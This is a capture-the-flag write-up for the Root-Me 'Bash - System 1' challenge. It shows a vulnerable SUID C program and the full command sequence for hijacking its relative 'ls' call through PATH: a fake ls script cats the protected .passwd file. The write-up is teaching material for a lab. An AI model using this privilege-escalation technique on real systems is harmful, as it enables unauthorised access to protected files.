### Challenge Documentation: Bash - System 1

**Category:** Root-Me / App-Script

**Link:** [Bash - System 1](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1)  

**Objective:**
The goal of this challenge is to exploit a SUID binary to access the hidden password file located at `/challenge/app-script/ch11/.passwd`.

#### 1. **Initial Setup**

The challenge provides access to a remote server with the following SSH credentials:
- **Host**: `challenge02.root-me.org`
- **Port**: `2222`
- **Username**: `app-script-ch11`
- **Password**: `app-script-ch11`

##### **Connection Command**
```bash
ssh -p 2222 app-script-ch11@challenge02.root-me.org
```

#### 2. **File Analysis**

Upon connecting to the server, list the contents of the challenge directory:
```bash
ls -l /challenge/app-script/ch11/
```

**Output:**
```
total 16
-r-sr-x--- 1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r----- 1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
-r--r----- 1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
```

##### Key Observations:
- `ch11` is the executable binary with **SUID permissions** (`r-s`), meaning it runs with elevated privileges.
- `ch11.c` is the source code for the binary (read-only access).

#### 3. **Understanding the Vulnerability**

The provided source code (`ch11.c`) contains the following:
```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

##### Analysis:
- The `system()` function executes the `ls` command on the `.passwd` file.
- Since the program runs with elevated privileges due to SUID, **we can hijack the `ls` command** by modifying the `PATH` environment variable.

#### 4. **Exploitation Steps**

##### Step 1: Create a Malicious `ls` Script
The idea is to replace the `ls` command with a custom script that uses `cat` to print the contents of the `.passwd` file.

Execute the following commands:
```bash
mkdir /tmp/mydir
echo -e '#!/bin/bash\n/bin/cat /challenge/app-script/ch11/.passwd' > /tmp/mydir/ls
chmod +x /tmp/mydir/ls
```

##### Step 2: Modify the `PATH` Variable
Prepend the directory containing the malicious script (`/tmp/mydir`) to the `PATH` environment variable:
```bash
export PATH=/tmp/mydir:$PATH
```

##### Step 3: Run the SUID Binary
Execute the SUID binary `ch11`:
```bash
/challenge/app-script/ch11/ch11
```

#### 5. **Output**

The SUID binary executes our malicious `ls` script, which uses `cat` to display the content of `.passwd`. The output is the flag for the challenge :
```
***************************
```

#### 6. **Summary of Commands**

Here is the complete set of commands used to solve the challenge:
```bash
ssh -p 2222 app-script-ch11@challenge02.root-me.org

# Analyze the directory
ls -l /challenge/app-script/ch11/

# Create the malicious 'ls' script
mkdir /tmp/mydir
echo -e '#!/bin/bash\n/bin/cat /challenge/app-script/ch11/.passwd' > /tmp/mydir/ls
chmod +x /tmp/mydir/ls

# Modify the PATH variable
export PATH=/tmp/mydir:$PATH

# Run the SUID binary
/challenge/app-script/ch11/ch11
```

#### 7. **Conclusion**

By hijacking the `ls` command using a custom script, we exploited the vulnerable SUID binary to print the contents of the `.passwd` file.

